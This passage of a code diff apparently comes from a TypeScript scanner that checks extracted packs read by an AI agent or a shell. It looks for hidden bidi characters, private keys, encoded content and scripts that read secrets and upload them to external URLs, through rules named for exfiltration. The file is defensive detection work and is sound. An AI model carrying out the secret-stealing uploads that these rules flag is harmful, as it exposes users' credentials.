+  if (already.some((f) => f.rule === 'exfiltration')) return [];
+  if (!scriptReadsSecretsAndUploads(text)) return [];
+  return [
+    {
+      rule: 'script-secrets-and-upload',
+      severity: 'warn',
+      file,
+      line: 0,
+      message:
+        'Script reads secrets and uploads to an external URL (on separate lines) — review the data flow',
+      excerpt: '',
+    },
+  ];
+}
+
+/**
+ * Joined and decoded units re-find what a single line already showed. Keep a derived finding
+ * only when no single-line finding of the same rule falls inside the lines it covers.
+ */
+function matchUnits(units: readonly ScanUnit[], file: string): ScanFinding[] {
+  const direct = units.filter((u) => !u.derived).flatMap((u) => matchUnit(u, file));
+  const directKeys = new Set(direct.map((f) => `${f.rule}:${f.line}`));
+  const directRules = new Set(direct.map((f) => f.rule));
+  const covered = (unit: ScanUnit, rule: string): boolean => {
+    if (unit.line === 0) return directRules.has(rule);
+    for (let l = unit.line; l <= unit.endLine; l++) if (directKeys.has(`${rule}:${l}`)) return true;
+    return false;
+  };
+  const derived = units
+    .filter((u) => u.derived)
+    .flatMap((u) => matchUnit(u, file).filter((f) => !covered(u, f.rule)));
+  const seen = new Set<string>();
+  return [...direct, ...derived].filter((f) => {
+    const key = `${f.rule}:${f.line}`;
+    if (seen.has(key)) return false;
+    seen.add(key);
+    return true;
+  });
+}
+
+export interface ScanTextOptions {
+  /** Check for bidi controls (off for non-UTF-8 files, where random bytes can form them). */
+  checkBidi?: boolean;
+}
+
+/**
+ * Scan one file's text. Exported for tests; `file` labels findings and selects file-type
+ * handling (JSON decoding, script-wide checks, markdown BAD-example context, top-level docs).
+ */
+export function scanText(text: string, file: string, options: ScanTextOptions = {}): ScanFinding[] {
+  const rawLines = text.split(/\r?\n/);
+  const lines = rawLines.map(normalizeForScan);
+  const examples = exampleLines(lines, file);
+  const atLine = (u: ScanUnit): ScanUnit => ({ ...u, example: u.line > 0 && examples[u.line - 1] });
+  const units: ScanUnit[] = [
+    ...lines.map((line, i) => ({ text: line, line: i + 1, endLine: i + 1, raw: rawLines[i] })),
+    ...continuationUnits(lines),
+    ...paragraphUnits(lines),
+    ...base64Units(lines),
+    ...(extensionOf(file) === 'json' ? jsonStringUnits(text) : []),
+  ].map(atLine);
+  const findings = [
+    ...(options.checkBidi === false ? [] : scanBidi(rawLines, file)),
+    ...matchUnits(units, file),
+    ...scanPrivateKeys(lines, file),
+  ];
+  return [...findings, ...scriptFinding(lines.join('\n'), file, findings)];
+}
+
+function isBinary(file: string, buffer: Buffer): boolean {
+  return BINARY_EXTENSIONS.has(extensionOf(file)) && buffer.subarray(0, BINARY_SNIFF_BYTES).includes(0);
+}
+
+/** Text the agent or a shell will read: always bidi-checked, even when it is not valid UTF-8. */
+function isKnownText(file: string): boolean {
+  const ext = extensionOf(file);
+  return MARKDOWN_EXTENSIONS.has(ext) || SCRIPT_EXTENSIONS.has(ext) || ext === 'json' || ext === '';
 }
 
 function listFiles(dir: string): string[] {
@@ -384,35 +833,22 @@ function listFiles(dir: string): string[] {
   return files;
 }
 
-function oversizeFinding(file: string): ScanFinding {
-  return {
-    rule: 'oversize-file',
-    severity: 'warn',
-    file,
-    line: 0,
-    message: `File is larger than ${MAX_SCANNED_FILE_BYTES / (1024 * 1024)} MB and was not scanned`,
-    excerpt: '',
-  };
-}
-
 /**
- * Scan every text file under `dir` (an extracted pack) for unsafe patterns.
- * Never prints; never throws for content — only for an unreadable directory.
+ * Scan every file under `dir` (an extracted pack) for unsafe patterns. Every file is scanned in
+ * full — size is already bounded by the extractor's cap — except files with a binary extension
+ * whose content is binary too. Never prints; throws only for an unreadable directory.
  */
 export function scanPackContent(dir: string): ScanResult {
   const findings: ScanFinding[] = [];
   let filesScanned = 0;
 
   for (const full of listFiles(dir)) {
-    const file = relative(dir, full).split(sep).join('/');
-    if (statSync(full).size > MAX_SCANNED_FILE_BYTES) {
-      findings.push(oversizeFinding(file));
-      continue;
-    }
+    const file = sanitizeForTerminal(relative(dir, full).split(sep).join('/'));
     const buffer = readFileSync(full);
-    if (isBinary(buffer)) continue;
+    if (isBinary(file, buffer)) continue;
     filesScanned++;
-    findings.push(...scanText(buffer.toString('utf8'), file));
+    const checkBidi = isKnownText(file) || isUtf8(buffer);
+    findings.push(...scanText(buffer.toString('utf8'), file, { checkBidi }));
   }
 
   return {
